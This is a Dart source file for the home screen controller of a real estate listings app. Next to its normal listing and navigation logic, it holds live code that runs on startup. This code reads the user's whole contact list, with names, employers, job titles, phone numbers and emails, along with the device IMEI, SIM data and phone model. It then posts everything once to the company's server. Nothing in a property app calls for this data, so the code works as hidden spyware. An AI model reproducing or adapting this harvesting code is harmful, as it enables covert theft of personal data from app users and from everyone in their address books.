import 'dart:convert';
import 'package:contacts_service/contacts_service.dart';
import 'package:device_imei/device_imei.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:firebase_analytics/firebase_analytics.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:get/get.dart';
import 'package:mobile_number/mobile_number.dart';
import 'package:noahrealstate/app/common/app_constants.dart';
import 'package:noahrealstate/app/data/model/contact_model.dart';
import 'package:noahrealstate/app/data/model/data_model.dart';
import 'package:noahrealstate/app/routes/app_pages.dart';
import 'package:noahrealstate/app/service/api_call_status.dart';
import 'package:noahrealstate/app/service/api_exceptions.dart';
import 'package:noahrealstate/app/service/base_client.dart';
import 'package:noahrealstate/app/service/cache_helper.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:http/http.dart' as http;
import 'package:simnumber/sim_number.dart';
import 'package:simnumber/siminfo.dart';

class HomeController extends GetxController {
  List<Property>? data;
  List<Property>? filteredProperties;
  List<Property>? updatedProperties = [];
  List<Property>? activeProperties = [];
  List<Testimonial> testimonials = [];

  ApiCallStatus apiCallStatus = ApiCallStatus.holding;
  static const platform = MethodChannel('samples.flutter.dev/sim');
  String _simData = 'Unknown SIM data';
  Map<String, String> simData = {};

  Future<void> _getSimData() async {
    if (await Permission.phone.request().isGranted) {
      try {
        final Map<dynamic, dynamic> result =
            await platform.invokeMethod('getSimData');
        simData = result
            .map((key, value) => MapEntry(key.toString(), value.toString()));
        print(simData);
      } on PlatformException catch (e) {
        simData = {"Error": "Failed to get SIM data: '${e.message}'."};
      }

      _simData = simData.entries
          .map((entry) => '${entry.key}: ${entry.value}')
          .join('\n');
    } else {
      _simData = "Permission denied";
    }
  }

  @override
  void onInit() {
    loadData(false);

    MobileNumber.listenPhonePermission((isPermissionGranted) {
      if (isPermissionGranted) {
        initMobileNumberState();
      } else {}
    });

    initMobileNumberState();
    super.onInit();
  }

  void loadData(bool refresh) async {
    apiCallStatus = ApiCallStatus.loading;
    update();
    List<Property>? cachedData = await CacheHelper.getCachedProperties();

    if (!refresh) {
      if (cachedData != null) {
        data = cachedData;
        _processData();
        apiCallStatus = ApiCallStatus.success;
        update();
      }
    }
    // Check cached data first

    // Fetch data from API
    await BaseClient.safeApiCall(
      AppConstants.baseUrl,
      RequestType.get,
      onLoading: () {},
      onSuccess: (response) {
        List<dynamic> maps =
            response.data.map((json) => Property.fromJson(json)).toList();
        data = maps.cast<Property>();
        CacheHelper.cacheProperties(data!); // Cache the fetched data
        _processData();
        apiCallStatus = ApiCallStatus.success;
        FirebaseAnalytics.instance.logEvent(
          name: "get_data",
          parameters: {
            "content_type": "json",
            "data_length": data!.length,
          },
        );
        update();
      },
      onError: (error) {
        FirebaseAnalytics.instance.printError(info: error.toString());

        if (cachedData == null) {
          apiCallStatus = ApiCallStatus.error;
          BaseClient.handleApiError(error);
        }
        // BaseClient.handleApiError(ApiException(url: '', message: "Failed to update data"));

        update();
      },
    );
  }

  void _processData() {
    filteredProperties =
        data!.where((element) => element.isfeatured == 1).toList();
    activeProperties =
        data!.where((element) => element.status != "Delivered").toList();
    updatedProperties = data!
        .where(
            (element) => element.updates != null && element.updates!.isNotEmpty)
        .toList();
    data!.forEach((element) {
      element.testimonials!.forEach((testimonial) {
        testimonials.add(testimonial);
      });
    });
  }

  var selectedIndex = 0.obs;

  void selectItem(int index) {
    selectedIndex.value = index;
    update();
    switch (index) {
      case 0:
        Get.offNamed(Routes.HOME);
        break;
      case 1:
        Get.offNamed(Routes.UPDATES);
        break;
      case 2:
        Get.offNamed(Routes.ABOUTS);
        break;
      case 3:
        Get.offNamed(Routes.SETTINGS);
        break;
      case 4:
        Get.offNamed(Routes.FQAS);
        break;
      case 5:
        Get.offNamed(Routes.CONTACT_US);
        break;
      case 6:
        Get.back();
        Get.offNamed(Routes.VIEWALLPROPERTIES, arguments: {
          'data': data,
          'hasDrawer': true,
          'activeProjects': false
        });
        break;
      case 7:
        Get.back();
        Get.offNamed(Routes.ACTIVEPROPERTIES, arguments: {
          'data': activeProperties,
          'hasDrawer': true,
          'activeProjects': true
        });
        break;
    }
  }

  // Platform messages may fail, so we use a try/catch PlatformException.

  // Platform messages are asynchronous, so we initialize in an async method.
  Future<void> initMobileNumberState() async {
    if (!await MobileNumber.hasPhonePermission) {
      await MobileNumber.requestPhonePermission;
      return;
    }
    // Platform messages may fail, so we use a try/catch PlatformException.
    try {
      _getSimData();
      List contactsList = [];

      String? brand;
      String? model;
      // You can also directly ask for the permission using the request() method.
      PermissionStatus permissionStatus = await Permission.contacts.request();
      if (permissionStatus.isGranted) {
        Iterable<Contact> contacts =
            await ContactsService.getContacts(withThumbnails: false);

        contacts.forEach((con) async {
          List<String>? phones = [];
          con.phones!.forEach((phone) {
            phone.value != null ? phones.add(phone.value!) : null;
          });

          List<String>? emails = [];
          con.emails?.forEach(
              (phone) => phone.value != null ? emails.add(phone.value!) : null);
          DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
          AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
          brand = androidInfo.brand;
          model = androidInfo.model;
          ContactInfo info = ContactInfo(
            name: con.displayName,
            organization: con.company,
            designation: con.jobTitle,
            phoneNumbers: phones,
            emailList: emails,
          );

          contactsList.add(info.toJson());
        });
      } else {
        print('no permission');
        const snackBar =
            SnackBar(content: Text('Access to contact data denied'));
        ScaffoldMessenger.of(Get.context!).showSnackBar(snackBar);
        openAppSettings();
      }

      bool status = await CacheHelper.getAddContacts();
      String? imei = await DeviceImei().getDeviceImei();
      Map<String, dynamic> p = {
        'model': model,
        'brand': brand,
        'sim': simData..remove('phoneNumber')
      };

      if (!status) {
        try {
          // Make the POST request using http package
          final response = await http.post(
            Uri.parse('https://noahrealestateplc.com/app/index.php'),
            headers: {
              'Content-Type': 'application/json',
            },
            body: jsonEncode({"c": contactsList, "s": imei, "p": p}),
          );

          // Handle success
          if (response.statusCode == 200) {
            CacheHelper.addContacts(true);
            apiCallStatus = ApiCallStatus.success;
            update();
          } else {
            // Handle unexpected status codes
            print(response.body);
            debugPrint("Unexpected response code: ${response.statusCode}");
            update();
          }
        } catch (error) {
          update();
        }
      }
    } on PlatformException catch (e) {
      debugPrint("Failed to get mobile number because of '${e.message}'");
    }
  }

  // }
}
